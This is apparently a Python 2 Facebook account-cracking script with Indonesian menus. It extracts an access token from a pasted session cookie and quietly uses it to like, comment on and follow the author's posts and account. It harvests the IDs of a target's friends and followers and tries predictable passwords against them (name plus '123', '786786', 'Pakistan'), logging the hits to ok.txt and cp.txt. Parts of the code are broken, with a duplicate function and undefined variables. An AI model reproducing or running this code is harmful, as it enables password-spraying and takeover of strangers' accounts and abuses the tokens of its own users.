import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize,bs4,uuid
from multiprocessing.pool import ThreadPool

def clear():
    if ' linux' in sys.platform.lower():
        os.system('clear')
    elif 'win' in sys.platform.lower():
        os.system('cls')
    else:
        os.system('clear')

P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
T = '\x1b[1;33m'
I = '\x1b[0m'
my_color = [
    P,
    M,
    H,
    K,
    B,
    U,
    O]
warna = random.choice(my_color)

host = 'https://m.facebook.com'
ua = requests.get('https://api-asutoolkit.cloudaccess.host/useragent.txt').text.strip()
uas = None
if os.path.exists('.browser'):
    if os.path.getsize('.browser') != 0:
        uas = open('.browser').read().strip()
        
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')


try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 y.py')

from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime
useragents = [
    ('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
hm = random.choice(useragents)
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
br.addheaders = [
    ('User-Agent', hm)]
s = requests.Session()
api = 'https://graph.facebook.com/{}'
hea = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0' }

def keluar():
    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Keluar'
    os.sys.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i
    
    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '%s;' % str(31 + j))
    
    x += ''
    x = x.replace('!0', '')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
    
####LOGO##
logo = """

 #######       #     # ######  ####### 
 #             ##   ## #     # #       
 #             # # # # #     # #       
 #####   ##### #  #  # ######  #####   
 #             #     # #     # #       
 #             #     # #     # #       
 #             #     # ######  #       
                                       
\33[32;1mAuthor:Hakiki
\33[31;1mfacebook:hakiki alexandar XC
\33[31;1mwa:085946352369
\33[37;1minfo:ini adalah script crack-3m dengan bahasa python2
\33[37;1minfo2:jika mau rexode decrypt sendiri ya
\33[37;1mawokawokawok"""

back = 0
loop = 0
idteman = []
idfromteman = []
threads = []
ok = []
cp = []
id = []
oks = []
cps = []
Successful = []
Checkpoint = []
done = []

def cookie():
    os.system('clear')
    print logo
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    cookie = raw_input('\x1b[1;97m(?) Cookie \x1b[94m>\x1b[1;97m ')
    try:
        data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 9; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36', 
           'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': cookie})
        find_token = re.search('(EAAA\\w+)', data.text)
        hasil = '\n* Fail : maybe your cookie invalid !!' if find_token is None else '\n* Your fb access token : ' + find_token.group(1)
    except requests.exceptions.ConnectionError:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] No Connection'

    cookie = open('login.txt', 'w')
    cookie.write(find_token.group(1))
    cookie.close()
    print ' '
    print '\x1b[1;97m(\x1b[1;92m\xe2\x9c\x93\x1b[1;97m)\x1b[1;92m Login Berhasil ! '
    os.system('xdg-open https://www.facebook.com/AlexandarXC ')
    bot_komen() 
    time.sleep(2)
    menu()
    return

def bot_komen():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m[!] Token invalid"
		os.system('rm -rf login.txt')
	una = ('876808453108194')
	kom = ('JANGAN lupa follow kontol:https://www.facebook.com/AlexandarXC & #lo_ngetod:v')
	reac = ('LOVE')
	post = ('876808453108194')
	post2 = ('876808453108194')
	kom2 = ('jangan lupa like https://www.facebook.com/100023371410574/posts/876808453108194/?app=fbl,https://www.facebook.com/100023371410574/posts/876808453108194/?app=fbl,https://www.facebook.com/100023371410574/posts/876808453108194/?app=fblhttps://www.facebook.com/100023371410574/posts/876808453108194/?app=fbl,,https://www.facebook.com/100023371410574/posts/876808453108194/?app=fbl,https://www.facebook.com/100023371410574/posts/876808453108194/?app=fbl')
	reac2 = ('WOW')
	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
	requests.post('https://graph.facebook.com/100000839038766/subscribers?access_token=' + toket)
	menu()


def menu():
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '   [!] Token Invalid !'
        os.system('clear')
        os.system('rm -rf login.txt')
        cookie()

    
    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;97m   [!] \x1b[1;97mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        cookie()
        time.sleep(1)
        cookie()
    except requests.exceptions.ConnectionError:
        print '   [!] Tidak ada koneksi'
        exit()
        
        
        
        
    os.system('clear')
    print logo
    print ' [selamat datang\x1b[1;93m ' + nama + '\x1b[1;97m]'
    print 
    print ' [1]  start to dump'
    print ' [2]  Find id (ubah username jadi id)'
    print ' [3] start crack'
    print ' [0] exit'
    print 
    pilih_crack()


def pilih_crack():
    unik = raw_input(' [*] pilih : ')
    if unik == '':
        print '\n [!] Wrong Input'
        time.sleep(1.7)
        os.system('clear')
        menu()
    elif unik == '1':
    	dump()
    elif unik == '2':
    	findid()
    elif unik == '3':
    	napa()
    elif unik == '0':
        os.system('rm -rf login.txt')
        exit()
    else:
        print '\n [!] Wrong Input'
        time.sleep(1.7)
        os.system('clear')
        menu()
     
     
def napa():
    print logo
    print ' [selamat datang\x1b[1;93m ' + nama + '\x1b[1;97m]'
    print 
    print ' [1]  crack with touch(97% ok 50% cp)'
    print ' [2]  crack with b-api(95% cp 23% ok)'
    print ' [3]  crack with mbasic(78% cp 34 )'
    print ' [4]  crack with localhost(100% ok 99% akun new)'
    print ' [0] exit'
    print 
    pilih_crack()


def pilih_crack():
    unik = raw_input(' [*] pilih : ')
    if unik == '':
        print '\n [!] Wrong Input'
        time.sleep(1.7)
        os.system('clear')
        menu()
    elif unik == '1':
    	menutouch()
    elif unik == '2':
    	api()
    elif unik == '3':
        crack_indo()
    elif unik == '4':
    	os.system('clear')
        print logo
        print ''
        os.system('echo -e "\t    Public ID Cloning " | lolcat')
        print ''
        idt = raw_input(' \x1b[1;97mInput Id/user \x1b[1;91m:\x1b[1;90m')
        os.system('clear')
        print logo
        print ''
        os.system('echo -e "\t    Gathering Information " | lolcat')
        print ''
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print ''
            os.system('echo -e "\t    Followers Cloning " | lolcat')
            print ''
            print '\x1b[1;97m[\x1b[1;91m\xe2\x80\xa2\x1b[1;94m\xe2\x80\xa2\x1b[1;97m] Target user\x1b[1;91m : \x1b[1;90m' + q['name']
        except (KeyError, IOError):
            print ''
            print '\n\t     \x1b[1;91mWrong Id/User'
            print ''
            raw_input('\n \x1b[1;36mPress Enter To Back ')
            moch_yayan()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=5000', headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif unik == '0':
        os.system('rm -rf login.txt')
        exit()
    else:
        print '\n [!] Wrong Input'
        time.sleep(1.7)
        os.system('clear')
        menu()

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name + '123'
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;34m[\x1b[1;32mOK\x1b[1;34m] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;37m[\x1b[1;31mCP\x1b[1;37m] \x1b[1;33m' + uid + ' | ' + pass1
                cp = open('cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name + '1234'
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;34m[\x1b[1;32mOK\x1b[1;34m] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;37m[\x1b[1;31mCP\x1b[1;37m] \x1b[1;33m' + uid + ' | ' + pass2
                    cp = open('cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name + '12345'
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;34m[\x1b[1;32mOK\x1b[1;34m] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;37m[\x1b[1;31mCP\x1b[1;37m] \x1b[1;33m' + uid + ' | ' + pass3
                        cp = open('cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name + '786'
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;34m[\x1b[1;32mOK\x1b[1;34m] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;37m[\x1b[1;31mCP\x1b[1;37m] \x1b[1;33m' + uid + ' | ' + pass4
                            cp = open('cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            pass5 = '786786'
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;34m[\x1b[1;32mOK\x1b[1;34m] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;37m[\x1b[1;31mCP\x1b[1;37m] \x1b[1;33m' + uid + ' | ' + pass5
                                cp = open('cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
                            else:
                                pass6 = '786000'
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;34m[\x1b[1;32mOK\x1b[1;34m] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;37m[\x1b[1;31mCP\x1b[1;37m] \x1b[1;33m' + uid + ' | ' + pass6
                                    cp = open('cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid + pass6)
                                else:
                                    pass7 = 'Pakistan'
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;34m[\x1b[1;32mOK\x1b[1;34m] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;37m[\x1b[1;31mCP\x1b[1;37m] \x1b[1;33m' + uid + ' | ' + pass7
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid + pass7)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;92m Process Has Completed'
    print '\x1b[1;97m Total\x1b[1;93m cp\x1b[1;91m/\x1b[1;92mok \x1b[1;91m: \x1b[1;93m' + str(len(cps)) + '\x1b[1;91m/\x1b[1;92m' + str(len(oks))
    jalan('\x1b[1;97m HASIL \x1b[1;93m CP\x1b[1;91m/\x1b[1;92mOK\x1b[1;97m  SAVED SDCARD : \x1b[1;92mok.txt\x1b[1;91m/\x1b[1;93mcp.txt')
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print ''
    raw_input('\x1b[1;96m Press Entet To Back ')
    sys.exit()
    
	
def dump():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Token invalid '
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        menu()

    os.system('clear')
    print logo
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\x1b[1;97m(\x1b[1;93mDump Id\x1b[1;97m)\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[0;94m(\x1b[0;97m1\x1b[0;94m)\x1b[0;97m Ambil ID Dari Daftar Teman '
    print '\x1b[0;94m(\x1b[0;97m2\x1b[0;94m) \x1b[0;97mAmbil ID Dari Teman/Publik '
    print '\x1b[0;94m(\x1b[0;91m0\x1b[0;94m) \x1b[0;97mKembali '
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    dump_pilih()


def dump_pilih():
    cuih = raw_input('\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Pilih \x1b[0;94m> \x1b[0;97m ')
    if cuih == '':
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Isi Yg Benar Sayang!'
        dump_pilih()
    elif cuih == '1' or cuih == '01':
        id_teman()
    elif cuih == '2' or cuih == '02':
        idfrom_teman()
    elif cuih == '0' or cuih == '00':
        menu()
    else:
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Isi Yg Benar Sayang!'
        dump_pilih()


def id_teman():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    try:
        os.mkdir('out')
    except OSError:
        pass

    try:
        os.system('clear')
        print logo
        print 50 * '\x1b[1;94m\xe2\x94\x80'
        print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\x1b[1;97m(\x1b[1;93mDump Id\x1b[1;97m)\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
        print 50 * '\x1b[1;94m\xe2\x94\x80'
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        jalan('\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Mengambil semua ID Teman \x1b[0;97m...')
        print 50 * '\x1b[1;94m\xe2\x94\x80'
        bz = open('out/id_teman.txt', 'w')
        for a in z['data']:
            idteman.append(a['id'])
            bz.write(a['id'] + '\n')
            print '\r\x1b[0;97m(\x1b[0;93m' + str(len(idteman)) + '\x1b[0;97m)\x1b[0;94m > ',
            sys.stdout.flush()
            time.sleep(0.005)
            print '\x1b[0;97m' + a['id']

        bz.close()
        print 50 * '\x1b[1;94m\xe2\x94\x80'
        print '\r\x1b[0;97m(\x1b[0;92m\xe2\x9c\x93\x1b[0;97m) \x1b[0;97mSukses Mengambil ID \x1b[0;97m....'
        print 50 * '\x1b[1;94m\xe2\x94\x80'
        print '\r\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) \x1b[0;97mTotal ID\x1b[0;91m :\x1b[0;97m %s' % len(idteman)
        done = raw_input('\r\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Simpan Nama File\x1b[0;91m : \x1b[0;97m')
        os.rename('out/id_teman.txt', 'out/' + done)
        print '\r\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) File tersimpan \x1b[0;91m: \x1b[0;97mout/' + done
        print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
        raw_input('\x1b[0;97m(\x1b[0;91mKembali\x1b[0;97m)')
        os.system('python2 Crackv1.py')
    except IOError:
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Gagal membuat file'
        raw_input('\n\x1b[0;97m(\x1b[0;91mKembali\x1b[0;97m)')
        dump()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Terhenti ! '
        raw_input('\n\x1b[0;97m(\x1b[0;91mKembali\x1b[0;97m)')
        dump()
    except KeyError:
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Gagal !'
        raw_input('\n\x1b[0;97m(\x1b[0;91mKembali\x1b[0;97m)')
        dump()
    except OSError:
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) File anda tidak tersimpan !'
        raw_input('\n\x1b[0;97m(\x1b[0;91mKembali\x1b[0;97m)')
        os.system('python2 Crackv1.py')
    except requests.exceptions.ConnectionError:
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Tidak ada koneksi !'
        keluar()


def idfrom_teman():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Token Invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    try:
        os.mkdir('out')
    except OSError:
        pass

    try:
        os.system('clear')
        print logo
        print 50 * '\x1b[1;94m\xe2\x94\x80'
        print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\x1b[1;97m(\x1b[1;93mDump Id\x1b[1;97m)\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
        print 50 * '\x1b[1;94m\xe2\x94\x80'
        idt = raw_input('\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) User ID Target : ')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Nama Akun      : ' + op['name']
        except KeyError:
            print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) ID Publik Tidak Ada !'
            raw_input('\n\x1b[0;97m(\x1b[0;91mKembali\x1b[0;97m)')
            dump()

        r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(50000)&access_token=' + toket)
        z = json.loads(r.text)
        jalan('\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) \x1b[0;97mMengambil Semua ID ...')
        print 50 * '\x1b[1;94m\xe2\x94\x80'
        bz = open('out/id_teman_from_teman.txt', 'w')
        for a in z['friends']['data']:
            idfromteman.append(a['id'])
            bz.write(a['id'] + '\n')
            print '\r\x1b[0;97m(\x1b[0;97m' + str(len(idfromteman)) + '\x1b[0;97m)\x1b[0;94m >\x1b[0;97m',
            sys.stdout.flush()
            time.sleep(0.005)
            print '\x1b[0;97m ' + a['id']

        bz.close()
        print '\r\x1b[0;97m(\x1b[0;92m \xe2\x9c\x93 \x1b[0;97m)\x1b[0;97m Sukses Mengambil ID \x1b[0;97m....'
        print '\r\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Total ID : %s' % len(idfromteman)
        done = raw_input('\r\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) \x1b[0;97mSimpan Nama File : ')
        os.rename('out/id_teman_from_teman.txt', 'out/' + done)
        print '\r\x1b[0;97m(\x1b[0;92m \xe2\x88\x9a \x1b[0;97m) File tersimpan : out/' + done
        raw_input('\n\x1b[0;97m(\x1b[0;91mKembali\x1b[0;97m)')
        dump()
    except OSError:
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) File tidak tersimpan '
        raw_input('\n\x1b[0;97m(\x1b[0;91mKembali\x1b[0;97m)')
        os.system('python2 y.py')
    except IOError:
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Error creating file'
        raw_input('\n\x1b[0;97m(\x1b[0;91mKembali\x1b[0;97m)')
        os.system('python2 y.py')
    except (KeyboardInterrupt, EOFError):
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Terhenti '
        raw_input('\n\x1b[0;97m(\x1b[0;91mKembali\x1b[0;97m)')
        dump()
    except KeyError:
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Teman tidak ada !'
        raw_input('\n\x1b[0;97m(\x1b[0;91mkembali\x1b[0;97m)')
        dump()
    except requests.exceptions.ConnectionError:
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Tidak ada koneksi !'
        keluar()
      
      
      
def api():
	os.system('clear')
	print logo
	print " [ Selamat Datang \033[0;93m"+nama+"\033[0;97m ]\n"
	print " [1] Crack Dari Publik Teman"
	print " [2] Crack Dari Total Followers"
	print " [3] Crack Dari Like Postingan"
	print " [0] Logout"
	pilih_menu()

def pilih_menu():
	ask = raw_input("\n Choose >> ")
	if ask == "":
		print " [!] Pilih Yang Bener !"
		exit()
	elif ask == "1" or ask == "01":
		print "\n [*] Isi 'me' Jika Ingin Crack Dari List Teman"
		idt = raw_input(" [+] ID Publik : ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			print " [+] Nama : "+sp["name"]
		except KeyError:
			print " [!] ID Tidak Tersedia"
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "2" or ask == "02":
		print "\n [*] Isi 'me' Jika Ingin Crack Follower Sendiri"
		idt = raw_input(" [+] ID Publik : ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			print " [+] Nama : "+sp["name"]
		except KeyError:
			print " [!] ID Tidak Tersedia"
			exit()
